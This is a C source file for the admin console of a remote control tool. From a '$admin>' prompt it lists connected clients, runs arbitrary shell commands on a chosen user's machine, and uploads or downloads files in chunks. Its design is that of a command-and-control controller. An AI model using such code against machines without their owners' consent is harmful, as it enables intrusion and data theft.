#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pthread.h> //for threading , link with lpthread
#include <time.h>	//sleep
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>

#include "../share/util.h"
#include "../share/app.h"

#define WAITING_TIME SLEEP_TIME * 5	//
#define CLIENTS_CMD (char*)"clients"
#define EXIT_CMD (char*)"exit"
#define CLEAR_CMD (char*)"cls"
#define HELP_CMD (char*)"help"

//role, command, target
char	target[MAX_LEN];
char	command[MAX_LEN];

//parse inputed line from std in
//userid command
//clients
//upload
//download
//before call this function, all string is trimed
bool doExecute(char* _username, char* _cmdall);

void showHelp() {
	printf("\ncommand type : [username] command [param1] [param2] ...\n"
		"\texit: \texit program.\n"
		"\thelp: \tshow help\n"
		"\tclients: \tshow now connected users.\n"
		"\tupload: \t[username] upload filetoupload dstpath\n"
		"\tdownload: \t[username] download filetodownload dstpath\n"
		"command may be any executable command on shell such as dir, tasklist, notepad, calc etc...\n\n"
	);
}
bool doDownload(char* _username, char* _dstpath, char* _srcpath) {
	if (!dirExists(_srcpath)) {
		printf("the path [%s] does not exist!\n", _srcpath);
		return false;
	}
	char cmd[MAX_LEN];
	sprintf(cmd, "%s %s", DOWNLOADCMD, _dstpath);

	C_REQ req(ADMIN, EXECUTE, NONE, cmd, 0, 0, _username);
	C_REQ req_pool(ADMIN, POOLING, EXECUTE, cmd, 0, 0, _username);

	//send command to specific user and wait his response
	char* buf = NULL;
	sendFormDataRead(&req, &buf, 0);
	int exe_status = getStatusCode(buf), total_cnt = 0;
	printf("waiting [%s]'s result!\n", _username);

	do {
		if (exe_status == DISCONNECTED) {		//not connected
			printf("[%s] Not Connected.\n", _username);
			break;
		}
		else if (exe_status == CMD_RETURN) {	//user returning result	
			printf("%s\n", getMessage(buf));
			total_cnt = getTotalCnt(buf);
			break;
		}
		else if (exe_status == CONNECTED) {	//user running command...
		   //send request to check if user finished command, 
			if (buf) free(buf);
			sendFormDataRead(&req_pool, &buf, 0);
			exe_status = getStatusCode(buf);
		}
		else {	//unnkonwn error occured.
			break;
		}
	} while (true);
	if (buf) free(buf);

	char filename[MAX_LEN]; memset(filename, 0, MAX_LEN);
	getFileName(_dstpath, filename);
	char savepath[MAX_LEN];
	sprintf(savepath,"%s\\%s",_srcpath,filename);
	int buf_len = 0;
	beginProgress();
	FILE* fp = fopen(savepath,"wb");
	for (int i = 0; i < total_cnt; i++) {
		C_REQ req(ADMIN, _username, i);
		while (req.code != SUCCESS) {
			sendFormDataRead(&req, &buf, &buf_len);
			sleep(SLEEP_TIME / 10);
		}
		showProgress(i+1, total_cnt);
		if (buf != NULL && buf_len > 0) fwrite(buf, 1, buf_len, fp);
		if (buf) free(buf);//buf = NULL;
	}
	fclose(fp);
	endProgress();
	printf("Successfully downloaded from %s.\n",_username);
	return true;
}


//complete
bool doUpload(char* _username, char* _srcpath, char* _dstpath) {
	if (!fileExists(_srcpath)) {
		printf("File [%s] does not exist!\n", _srcpath);
		return false;
	}

	printf("Uploading [%s] File to %s\n", _srcpath, _username);
	
	int filesize = getFileSize(_srcpath);
	int buf_size = filesize > 10 * 1024 * 1024 ? 10 * 1024 * 1024 : 2 * 1024 * 1024;
	int total_cnt = filesize / buf_size + 1, cnt = 0;

	char* buf = (char*)malloc(buf_size);
	beginProgress();

	FILE* fp = fopen(_srcpath, "rb");
	while (!feof(fp) && cnt < total_cnt) {
		int readed = fread(buf, 1, buf_size,fp);
		C_REQ req(ADMIN, buf, readed, _username, cnt);
		while(req.code != SUCCESS) {
			sendFormData(&req);
			sleep(SLEEP_TIME/10);
		}
		showProgress(++cnt, total_cnt);
	}
	endProgress();
	if(buf) free(buf);
	fclose(fp);
	return true;
}

//executing normal command that executable on command prompt(windows) or bash(linux)
bool doExecute(char* _username, char* cmd) {
	C_REQ req(ADMIN, EXECUTE, NONE,cmd, 0, 0, _username);
	C_REQ req_pool(ADMIN, POOLING, EXECUTE, cmd, 0, 0, _username);
	
	//send command to specific user and wait his response
	char* buf = NULL;
	sendFormDataRead(&req, &buf, 0);
	int exe_status = getStatusCode(buf);
	printf("waiting [%s]'s result!\n", _username);

	do {
		if (exe_status == DISCONNECTED)	{		//not connected
			printf("[%s] Not Connected.\n", _username);
			break;
		}else if (exe_status == CMD_RETURN) {	//user returning result	
			printf("%s\n", getMessage(buf));
			break;
		}else if (exe_status == CONNECTED) {	//user running command...
			//send request to check if user finished command, 
			if (buf) free(buf);
			sendFormDataRead(&req_pool, &buf, 0);
			exe_status = getStatusCode(buf);
		}
		else {	//unnkonwn error occured.
			break;
		}
	} while (true);
	if (buf) free(buf);
	return true;
}

bool doList() {
	C_REQ req(ADMIN, LIST, NONE);
	char* buf = NULL;
	sendFormDataRead(&req, &buf, NULL);

	if (req.code == SUCCESS)
		printf("%s\n", getMessage(buf));
	if (buf) free(buf);
	return true;
}

int SendCommand(char* _arg) {
	//save original cmd line to new buffer, cos it should be tokenized later...
	char* ori_line = (char*)calloc(MAX_LEN, 1);
	memcpy(ori_line, _arg, strlen(_arg));

	//split cmd line to string array , with space
	char* line = _arg;int paramcnt = 0;
	char** params = splitline(line, &paramcnt);
	if (paramcnt < 1) {
		free(ori_line);
		return 0;
	}
	//normally cmd has more 2 param
	bool resultflag = false;
	switch (paramcnt)
	{
		case 1:{	//clients, help, exit ...
			char* cmd = params[0];
			if (memcmp(cmd, CLIENTS_CMD, strlen(CLIENTS_CMD)) == 0) {
				resultflag = doList();
			}else
			if (memcmp(cmd, EXIT_CMD, strlen(EXIT_CMD)) == 0) {
				exit(0);
			}else
			if (memcmp(cmd, HELP_CMD, strlen(HELP_CMD)) == 0) {
				showHelp();
			}else if (memcmp(cmd, CLEAR_CMD, strlen(CLEAR_CMD)) == 0) {
				system("cls");
			}
			else 
				printf("there is no proper command.To view Commands, type <help>\n");
			break;
		}
		default: {
			//cmd line is [user] [command] [param1] [param2]
			char* user = params[0];
			char* cmd = params[1];
			//upload command - [user] [command] [src] [dst]
			if (strlen(cmd) == strlen(UPLOADCMD) && memcmp(cmd, UPLOADCMD, strlen(UPLOADCMD)) == 0) {
				if (paramcnt < 4) {
					printf("This command requires 4 params. E.g. [username] [upload] [srcpath] [dstpath]\n");
					return 0;
				}
				char* srcpath = params[2], *dstpath = params[3];
				resultflag = doUpload(user, srcpath, dstpath);

				int namelen = strlen(params[0]);
				char* cmd = ori_line + namelen + 1;
				resultflag = doExecute(user, cmd);
			}
			//download command - [user] [command] [src] [dst]
			else if (strlen(cmd) == strlen(DOWNLOADCMD) && memcmp(cmd, DOWNLOADCMD, strlen(DOWNLOADCMD)) == 0) {
				if (paramcnt < 4) {
					printf("This command requires 4 params. E.g. [username] [download] [srcpath] [dstpath]\n");
					return 0;
				}
				char* srcpath = params[2], *dstpath = params[3];
				resultflag = doDownload(user, srcpath, dstpath);
			}
			//normal command
			else {
				int namelen = strlen(params[0]);
				char* cmd = ori_line + namelen + 1;
				resultflag = doExecute(user, cmd);
			}
			break;
		}
	}
	free(ori_line);
	return resultflag;
}










int main(int argc, char* argv[]) {
	showHelp();
	//read command line from users input and run the command
	char* line = (char*)calloc(1, MAX_LEN);
	while (true) {
		memset(line, 0, MAX_LEN);
		//like bash or command prompt
		printf("\n$admin> ");
		fgets(line, MAX_LEN, stdin);
		//before process string from user, trim it.(\n, space, \t etc...)
		char* trimed = strtrim(line);
		if(trimed) SendCommand(trimed);
		if(trimed) free(trimed);
	}
	free(line);
	return(0);
}